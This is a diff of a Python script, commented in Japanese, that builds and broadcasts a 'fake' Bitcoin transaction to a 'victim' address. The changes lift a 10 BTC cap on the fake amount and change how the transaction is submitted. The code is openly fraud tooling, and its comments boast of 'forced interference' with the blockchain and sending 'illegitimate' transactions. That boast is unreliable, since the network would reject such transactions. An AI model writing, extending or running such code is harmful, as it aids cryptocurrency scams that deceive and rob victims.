@@ -91,11 +91,12 @@ else:
 
 fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
 
-if amount_btc > 10:
-    print(f"[!] Fake remittance amount exceeds 10BTC.")
+send_amount = to_satoshi(amount_btc)
+
+if balance < send_amount:
+    print(f"[!] insufficient funds. ")
     exit()
 
-send_amount = to_satoshi(amount_btc)
 change_btc_amt = (balance - send_amount) #おつり
 if testnet:
     tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
@@ -120,25 +121,13 @@ print()
 
 print()
 print("OK")
-print("Send fake TX...")
 
 input(" --- Press enter key... --- ")
-rpc_node.sendrawtransaction(tx_victim)
-#if testnet:
-#    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.testnet.pubaddr1} '[\"{tx_victim}\"]' false")
-#else:
-#    input(f"      Press enter after running the following command on your node:    bitcoin-cli generateblock {fake_from.address.mainnet.pubaddr1} '[\"{tx_victim}\"]' false")
 print()
 print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
 print()
-try:
-    result = rpc_node.submitblock(tx_victim)
-except:
-    pass
-print()
 broadcast_transaction(tx_victim, testnet)
 print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
-print(result)
 print()
 #ゴリ押し
 print()
